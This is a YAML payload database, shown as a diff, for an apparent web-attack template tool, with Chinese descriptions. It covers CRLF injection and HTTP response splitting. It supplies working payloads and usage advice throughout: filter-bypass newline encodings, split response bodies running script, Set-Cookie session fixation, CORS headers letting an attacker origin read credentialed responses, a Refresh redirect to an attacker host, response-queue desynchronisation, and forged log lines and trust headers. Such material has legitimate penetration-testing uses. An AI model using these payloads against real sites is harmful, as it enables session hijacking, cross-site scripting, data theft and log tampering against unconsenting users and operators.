@@ -1,0 +1,443 @@
+ruleDB: v0.1.0
+# CRLF 注入 / HTTP 响应拆分。
+#
+# 载荷形态是一段**会被拼进 HTTP 头里**的文本，所以 content_type 基本都是 raw
+# （HTTP 头的值就是一段任意字符串，不是任何一种语言的语法）；只有「拆出新响应体、
+# 注入的是一整页 HTML」那条按载荷文本本身的语法记 html。
+#
+# 和 data/redirect/generic.yaml 里 redirect.generic.crlf.location 的分工：
+# 那条是**重定向视角**（拆出一个 Location，把普通跳转升级成响应头注入），
+# 这里专注「拆头 / 拆体」本身——探测、注入 Set-Cookie、拆出新的响应体，
+# 以及 Content-Type / Content-Length / Transfer-Encoding 被改写后的后果。
+#
+# `nl` 是**字典槽位**而不是几个独立槽位：同一个载荷在 URL 参数里、在 Cookie 值里、
+# 在已经解码过一遍的值里需要的换行形态不一样，拆开写用户能拼出「一半 %0d%0a
+# 一半原样 CRLF」的怪串，而且没法静态校验。变体覆盖 %0d%0a / %0a / %0d /
+# 原样 CRLF / 双重编码五种。
+#
+# requires 的取舍（这张表是筛选器，多写会让用户勾了「目标没有 X」后仍看到用不上的模板）：
+#   header-sink  每条都加：输入进不到响应头时，这些串一个都不成立
+#   weak-filter  只加给「专门绕过滤」的条目（Unicode 换行、续行写法、
+#                用 Refresh 绕只拦 Location 的黑名单）。目标没有过滤时，
+#                这些写法严格劣于基本写法，直接看 crlf.generic.probe.header
+#
+# 两条必须说清的边界：
+#   1. Node 与 Go 的 HTTP 实现在头里遇到 CR/LF 会**直接报错**，那不是「过滤」而是
+#      拒绝构造响应。这类栈上整批载荷都不成立，别反复试。
+#   2. 注入 Content-Length / Transfer-Encoding 只是**改写下游读这一段字节流的方式**
+#      （响应队列错位）。真正的请求走私要靠连接复用与两端解析差异，本工具的载荷
+#      是一段文本，表达不了那种报文——这两条只描述后果，不是走私载荷。
+
+templates:
+  # ---- 探测：确认「输入进头了、而且还能拆」----
+
+  - id: crlf.generic.probe.header
+    name: 注入自定义响应头（基本拆分）
+    desc: 第一步先用它：拆出一个不存在的头，确认输入真的进了响应头、而且 CR/LF 没被拦。有回显就直接看响应里有没有 X-Crlf-Probe；看不到响应头时改看状态码或响应长度有没有变化（严格实现遇到非法头会回 400/502）。Location / Set-Cookie 那些位置的过滤通常更严，别用它们做第一步判断
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>X-Crlf-Probe:%20injected"
+    vars: []
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.probe.bare
+    name: 裸换行（只拆一个、不写新头）
+    desc: 只注入一个换行，后面什么都不接。注入成功时当前这个头会被从中间截断，原头剩下的部分会变成一行非法头——严格实现直接 400/502，宽松实现丢弃那一行。无回显时靠状态码或长度差异就能判断能不能拆；没有差异说明 CR/LF 被拦了，后面那些拆头的载荷都不必试
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>"
+    vars: []
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.probe.folded
+    name: 续行写法（CRLF 后面跟一个空格）
+    desc: 过滤只是「把 %0d%0a 删掉」时用：注入的其实是「换行 + 一个空格」，换行被删掉后那个空格会留在原头的值里（响应的头里看得出来），而 HTTP 里以空格开头的行本来就是上一行的**续行**、等价于一个空格——所以在支持续行的实现上，内容还是接进了原头。现代服务器多半直接判 400，所以只用它判断过滤方式，别当主力载荷
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>%20X-Crlf-Probe:%201"
+    vars: []
+    requires: [header-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.probe.unicode
+    name: Unicode 换行变形（%e5%98%8a%e5%98%8d）
+    desc: 过滤只查 %0d%0a / %0a / %0d 这类明文换行时用：%e5%98%8a%e5%98%8d 是 U+560A 与 U+560D，部分 Java 与 Node 的 HTTP 实现在按单字节编码处理头时会把它们截成 0x0A 与 0x0D，等于绕过所有明文检查拿到一个真换行。拼进去的位置和 probe.header 完全一样（自定义头 X-Crlf-Probe 前面），区别只在换行的写法。只在那些实现上成立，且要求输入先被解码一次再进头；不确定就先跑 probe.header 对照
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    body: "%e5%98%8a%e5%98%8dX-Crlf-Probe:%20injected"
+    vars: []
+    requires: [header-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 拆出新响应体 ----
+
+  - id: crlf.generic.body.split.html
+    name: 拆出新响应体（HTML / XSS）
+    desc: 拼进去的是**当前这个头的位置**：两个换行结束整个头段，后面跟的 HTML 就成了新的响应体——这才是狭义的「响应拆分」，浏览器把它当文档解析执行，等于不需要回显也能打 XSS。前提是头里允许 CR/LF；Node 与 Go 的实现在头里遇到 CR/LF 直接报错，那类栈上这条整条不成立。别拿它对着会重写响应的代理发，代理多半会把这个头丢掉
+    vuln: [crlf]
+    content_type: [html]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: |-
+      <<nl.seq>><<nl.seq>><html><body><script>alert(document.domain)</script></body></html>
+    vars: []
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.body.split.marker
+    name: 拆出新响应体（只留文本标记）
+    desc: 和 HTML 那条同一个机制，但注入的是纯文本。用处是**先确认拆体成立**：响应正文里出现这个标记，就说明头段被提前结束、注入的内容真的成了正文。只想证明漏洞、或对方会人工复核响应（响应里执行脚本太扎眼）时用它
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>><<nl.seq>>crlf-split-marker"
+    vars: []
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 拆出具体的头 ----
+
+  - id: crlf.generic.cookie.set
+    name: 注入 Set-Cookie（会话固定）
+    desc: 会话 Cookie 名已知时用它把受害者的会话固定成你选的值，之后你拿同一个值登录就是他的会话。拼进去的位置是**当前这个头的值中间**：注入点后面往往还有原头没写完的内容（常见是「; Path=/; Secure」这类后缀），那一截会跟到你新注入的头里——把后缀一起写进 value，或在注入前先补一个分号把它隔开。Cookie 带 HttpOnly 也不影响这条
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>Set-Cookie:%20sessionid=<<sid>>;%20Path=/"
+    vars: [sid]
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.header.content_type
+    name: 注入 Content-Type（升级成 XSS，不拆体）
+    desc: 输入会在正文里原样回显、但响应的 Content-Type 是 text/plain 或 application/json 时用：改成 text/html 之后，回显的标签就会被浏览器解析执行——不需要拆响应体，也不需要两个换行。同名头谁生效取决于实现（多数取第一个，也有取最后一个或拼接的），注入点若落在原来的 Content-Type **之后**，很可能被忽略
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>Content-Type:%20text/html;%20charset=utf-8"
+    vars: []
+    requires: [header-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.header.refresh
+    name: 注入 Refresh 跳转
+    desc: 目标只拦 Location（黑名单或白名单都只盯它）时用：Refresh 是 HTML 时代留下的跳转头，浏览器照样认，`0;url=` 后面的地址会被立刻加载。拼进去的是**响应头里当前头的位置**。和 redirect.generic.crlf.location 的区别就在这里——那条注入的是 Location，会被拦；这条注入的是个没人拦的头
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+      scheme: {options: [http, https], default: https}
+    body: "<<nl.seq>>Refresh:%200;url=<<scheme>>://<<evil>>/"
+    vars: [evil]
+    requires: [header-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.header.content_length
+    name: 注入 Content-Length（响应队列错位）
+    desc: 在响应头里补一个 Content-Length。它的意义不是「多读到数据」，而是让**下游**（反向代理、前置服务器）按这个长度去切这段字节流：代理读够这么多字节就认为响应结束，剩下的字节会被算进下一个响应的头部，响应队列因此错位，一个响应的正文可能被当成另一个请求的响应发出去。改成长度 0 是最省事的观察方式。注意真正的走私要靠连接复用与两端解析差异，本工具的载荷是一段文本、表达不了那种报文，这条不是走私载荷
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+      # 长度本身是参数：0 用来观察「正文被吃掉」，也可以填成比真实正文略大/略小
+      size: {options: ["0", "1", "10", "100"], default: "0"}
+    body: "<<nl.seq>>Content-Length:%20<<size>>"
+    vars: []
+    requires: [header-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.header.transfer_encoding
+    name: 注入 Transfer-Encoding（分块读法错位）
+    desc: 在响应头里补一条 Transfer-Encoding 声明、值写 chunked，让下游按分块编码去读原本不是分块的响应体——第一段块长度解析失败就断开，解析成功则正文被切短、剩下的字节留给下一个响应。和 Content-Length 那条是同一类错位（一个改长度、一个改读法），**不要同时注入**，代理多半直接判 400。同样只描述后果，不是完整的走私报文
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>Transfer-Encoding:%20chunked"
+    vars: []
+    requires: [header-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: crlf.generic.header.cors
+    name: 注入 CORS 头（跨站读响应）
+    desc: 目标自己没有 CORS 配置、或配成只放行同源时用：注入 ACAO 与 ACAC 之后，攻击者页面就能带凭据跨站读这个响应——不用在目标里执行任何脚本，等于把 CRLF 直接变成跨站数据窃取。两条头都要注入，所以载荷里有两个换行。ACAO 必须写成攻击者站点的**准确来源**（写成通配符时浏览器不允许带凭据），而且那页得真的挂在这个来源上；挂页面属于你自己的准备，不在工具的前提词表里
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+    body: "<<nl.seq>>Access-Control-Allow-Origin:%20https://<<evil>><<nl.seq>>Access-Control-Allow-Credentials:%20true"
+    vars: [evil]
+    requires: [header-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 拆出一个完整的响应 ----
+  # 载荷整体是一段 HTTP 报文（状态行 + 头 + 正文），**不是一个 HTML 片段**，
+  # 所以 content_type 记 raw；正文里那段 HTML 只是报文的载荷，不代表载荷的语法。
+
+  - id: crlf.generic.response.split.full
+    name: 拆出一个完整的 HTTP/1.1 响应
+    desc: >-
+      需要一个**能独立成立的完整响应**、而不是只拆出一段正文时用（目标前面有代理、
+      这段输出要经它转发给别的客户端时，只拆正文往往对不上状态行与头）。
+      第一个换行结束当前这个头，第二个结束整个头段并开始新的状态行，第三个之后是新响应的头段，
+      再两个换行才开始正文。新响应故意不写 Content-Length，靠 Connection: close 让下游
+      按连接关闭判断正文结束——要精确控制长度就把它换成 Content-Length、并自己数正文的字节数。
+      只在头里允许 CR/LF 时成立：Node 与 Go 的实现在头里遇到 CR/LF 直接报错，那类栈上整条不成立。
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+      resp:
+        options:
+          - {id: ok,       name: "200 OK（正常返回，最不扎眼）",     num: "200", reason: "OK"}
+          - {id: redirect, name: "302 Found（让下游再跳一次）",      num: "302", reason: "Found"}
+          - {id: notfound, name: "404 Not Found",                   num: "404", reason: "Not Found"}
+        default: ok
+      js:
+        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
+        default: "alert(1)"
+    body: |-
+      <<nl.seq>><<nl.seq>>HTTP/1.1%20<<resp.num>>%20<<resp.reason>><<nl.seq>>Content-Type:%20text/html<<nl.seq>>Connection:%20close<<nl.seq>><<nl.seq>><script><<js>></script>
+    vars: []
+    requires: [header-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 从 Cookie 的值里注入 ----
+  # 与上面几条的分工：那些是「输入落在响应头里」，这条的**注入点本身是一个 Cookie 的值**，
+  # 目标再把这个值回显进响应头或写进日志。提交方式要选「Cookie」。
+
+  - id: crlf.generic.cookie.inject
+    name: 从 Cookie 值里注入换行
+    desc: >-
+      注入点是一个 Cookie 的值、而目标把它原样回显进响应头（或写进日志）时用；
+      提交方式选「Cookie」，Cookie 名与请求头名在界面上填。注意浏览器与 HTTP 客户端
+      会拒收值里含**原样** CR/LF 的 Cookie，所以默认走的是编码形态——原样形态只用在你
+      直接手发报文、或这个值先被解码一次再进头的时候。字母前缀是为了让值非空：
+      有些实现会跳过空值的 Cookie，值以换行开头时容易在那一层被丢掉。
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+      pre:
+        options:
+          - {id: alnum, name: "字母前缀（值非空，服务端不会跳过它）", text: "x"}
+          - {id: empty, name: "不加前缀（值直接以换行开头）",         text: ""}
+        default: alnum
+    body: "<<pre.text>><<nl.seq>>X-Crlf-Probe:%20injected"
+    vars: []
+    requires: [header-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 注入点在请求头里（不是响应头）----
+  # 上面所有条目的前提都是 header-sink（输入进到**响应**头）。这一条不一样：
+  # 注入点在**请求**头里，打的是后端把可控请求头拼进日志行、或拼进它发往下游的
+  # 请求头那两个场景，所以 requires 换成 log-writable。
+
+  - id: crlf.generic.request.inject
+    name: 请求头里注入换行（打后端日志与下游请求头）
+    desc: >-
+      注入点在**请求头**里而不是响应头里时用——提交方式选「请求头」，头名填
+      X-Forwarded-For、User-Agent、Referer 这类会被后端记录或转发的头。
+      打的是后端把这个值拼进日志行（日志伪造、栽赃，或者骗过按日志做告警的监控），
+      或者拼进它发往下游/内部服务的请求头（伪造 X-Forwarded-For 让后端按你的 IP 判来源、
+      补一个内部才认的信任头）。没有回显时看日志里有没有多出一行、或后端有没有按你伪造的头办事。
+      目标把请求头直接丢给结构化日志（JSON）时换行会被转义、这条不成立。
+    vuln: [crlf]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      nl:
+        options:
+          - {id: crlf, name: "%0d%0a（明文的百分号编码，URL 参数里最常用）", seq: "%0d%0a"}
+          - {id: lf,   name: "%0a（只有 LF，部分实现照样拆头）",             seq: "%0a"}
+          - {id: cr,   name: "%0d（只有 CR）",                              seq: "%0d"}
+          - {id: raw,  name: "原样 CRLF（值直接落在头里、不经 URL 编码时用）", seq: "\r\n"}
+          - {id: dbl,  name: "%250d%250a（双重编码，过滤器只解码一次时用）",  seq: "%250d%250a"}
+        default: crlf
+      inj:
+        options:
+          - {id: probe, name: "探针头（先确认后端真的把请求头拼出去了）",   text: "X-Crlf-Probe:%20true"}
+          - {id: xff,   name: "伪造 X-Forwarded-For（后端按它判来源 IP）", text: "X-Forwarded-For:%20127.0.0.1"}
+          - {id: admin, name: "伪造一个只有内部才认的信任头",              text: "X-Admin:%20true"}
+          - {id: log,   name: "伪造一行日志（日志伪造 / 栽赃）",           text: "1970-01-01T00:00:00Z%20INFO%20login%20ok%20user=admin"}
+        default: probe
+    body: "<<nl.seq>><<inj.text>>"
+    vars: []
+    requires: [log-writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
